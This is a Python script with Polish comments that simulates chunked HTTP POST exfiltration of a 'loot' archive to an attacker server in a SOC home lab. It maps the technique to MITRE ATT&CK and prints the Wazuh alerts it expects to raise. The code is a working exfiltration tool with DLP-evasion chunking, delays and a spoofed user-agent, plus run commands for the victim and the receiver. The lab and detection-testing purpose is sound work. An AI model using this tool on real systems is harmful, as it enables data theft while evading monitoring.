#!/usr/bin/env python3
"""
Atak 05 — Eksfiltracja danych przez HTTP POST (chunked)
========================================================

MITRE ATT&CK:
    - T1041     — Exfiltration Over C2 Channel
    - T1567.002 — Exfiltration Over Web Service: Cloud Storage (analogiczny pattern)
    - T1030     — Data Transfer Size Limits (chunkowanie)

Symuluje typowy schemat post-exploitation: skompresowany "loot" (dokumenty,
hashe, klucze) jest dzielony na chunki i wysyłany w wielu requestach HTTP
POST do serwera atakującego.

Chunkowanie + opoznienia maja obejsc:
    a) limity rozmiaru request body na posrednikach
    b) progi DLP wykrywajace pojedynczy duzy upload
    c) statystyczna detekcje "burst transfer"

Wymaga: Python 3.8+, requests

Uruchomienie (na WS01 — wymaga zainstalowanego Pythona):
    python 05-data-exfiltration.py \\
        --target http://192.168.30.30:8000/upload \\
        --file C:\\Windows\\Temp\\loot.zip \\
        --chunk-size 1048576 \\
        --delay 0.5

Po stronie atakujacego (Kali) — prosty odbiornik:
    cd /tmp && python3 -m http.server 8000
"""

import argparse
import hashlib
import os
import sys
import time
from pathlib import Path
from typing import Optional

try:
    import requests
except ImportError:
    sys.stderr.write(
        "[!] Brakuje pakietu 'requests'.\n"
        "    Zainstaluj:  python -m pip install requests\n"
    )
    sys.exit(1)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def human(size_bytes: int) -> str:
    """Zamien bajty na czytelna postac (KB/MB/GB)."""
    for unit in ("B", "KB", "MB", "GB"):
        if size_bytes < 1024:
            return f"{size_bytes:.1f} {unit}"
        size_bytes /= 1024
    return f"{size_bytes:.1f} TB"


def sha256_of_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as f:
        for block in iter(lambda: f.read(1 << 16), b""):
            h.update(block)
    return h.hexdigest()


def banner() -> None:
    print(r"""
   _____                                _   _
  | ____|_  ___ __ ___   _____ _ __ ___| |_| |
  |  _| \ \/ / '_ ` _ \ / _ \ '__/ __| __| |
  | |___ >  <| | | | | |  __/ |  \__ \ |_| |
  |_____/_/\_\_| |_| |_|\___|_|  |___/\__|_|

  Attack 05 — HTTP POST exfiltration (T1041)
""")


# ---------------------------------------------------------------------------
# Main exfil routine
# ---------------------------------------------------------------------------
def exfiltrate(
    target_url: str,
    file_path: Path,
    chunk_size: int,
    delay: float,
    user_agent: str,
    session_id: Optional[str] = None,
) -> int:
    """
    Wysyla plik w chunkach do target_url.
    Zwraca kod wyjsciowy (0 = ok, !=0 = blad).
    """
    if not file_path.is_file():
        print(f"[!] Plik nie istnieje: {file_path}")
        return 2

    total_size = file_path.stat().st_size
    n_chunks = (total_size + chunk_size - 1) // chunk_size
    file_hash = sha256_of_file(file_path)

    print(f"[+] Plik:        {file_path}")
    print(f"[+] Rozmiar:     {human(total_size)} ({total_size} B)")
    print(f"[+] SHA256:      {file_hash}")
    print(f"[+] Chunk:       {human(chunk_size)}")
    print(f"[+] Liczba chunkow: {n_chunks}")
    print(f"[+] Target:      {target_url}")
    print(f"[+] Delay:       {delay} s miedzy chunkami")
    print()

    session = requests.Session()
    session.headers.update({
        "User-Agent": user_agent,
        "X-Session-Id": session_id or hashlib.md5(str(time.time()).encode()).hexdigest()[:12],
        "X-Total-Chunks": str(n_chunks),
        "X-File-Hash": file_hash,
        "X-File-Name": file_path.name,
    })

    t_start = time.time()
    sent_bytes = 0

    with file_path.open("rb") as f:
        for idx in range(1, n_chunks + 1):
            data = f.read(chunk_size)
            try:
                resp = session.post(
                    target_url,
                    data=data,
                    headers={"X-Chunk-Id": str(idx)},
                    timeout=15,
                )
                status = resp.status_code
            except requests.RequestException as e:
                print(f"    [!] Chunk {idx}/{n_chunks} blad: {e}")
                return 3

            sent_bytes += len(data)
            pct = sent_bytes * 100 / total_size
            print(
                f"    [+] Chunk {idx:>3}/{n_chunks} "
                f"({human(len(data))})  HTTP {status}  "
                f"progress: {pct:5.1f}%"
            )

            if idx < n_chunks and delay > 0:
                time.sleep(delay)

    elapsed = time.time() - t_start
    rate = sent_bytes / elapsed if elapsed > 0 else 0

    print()
    print(f"[+] Zakonczono.")
    print(f"    Wyslano:     {human(sent_bytes)} w {elapsed:.1f} s")
    print(f"    Sredni rate: {human(int(rate))}/s")
    print()
    print("Spodziewane alerty w Wazuh:")
    print("    Rule 100230 (level 8 single, agreguje do level 10): "
          "Large data transfer from internal host to external IP")
    print("    Rule 100231 (level 12): Archive creation + outbound connection (korelacja)")
    return 0


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="HTTP POST exfiltration simulator for SOC home lab.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    p.add_argument(
        "--target",
        required=True,
        help="URL odbiornika (np. http://192.168.30.30:8000/upload)",
    )
    p.add_argument(
        "--file",
        required=True,
        type=Path,
        help="Sciezka do pliku do eksfiltracji",
    )
    p.add_argument(
        "--chunk-size",
        type=int,
        default=1 << 20,
        help="Rozmiar chunka w bajtach (domyslnie 1 MB)",
    )
    p.add_argument(
        "--delay",
        type=float,
        default=0.5,
        help="Opoznienie miedzy chunkami w sekundach (domyslnie 0.5)",
    )
    p.add_argument(
        "--user-agent",
        default=(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        ),
        help="User-Agent (domyslnie typowy Chrome)",
    )
    p.add_argument(
        "--session-id",
        default=None,
        help="X-Session-Id (do korelacji po stronie odbiornika)",
    )
    return p.parse_args()


def main() -> int:
    args = parse_args()
    banner()
    return exfiltrate(
        target_url=args.target,
        file_path=args.file,
        chunk_size=args.chunk_size,
        delay=args.delay,
        user_agent=args.user_agent,
        session_id=args.session_id,
    )


if __name__ == "__main__":
    sys.exit(main())
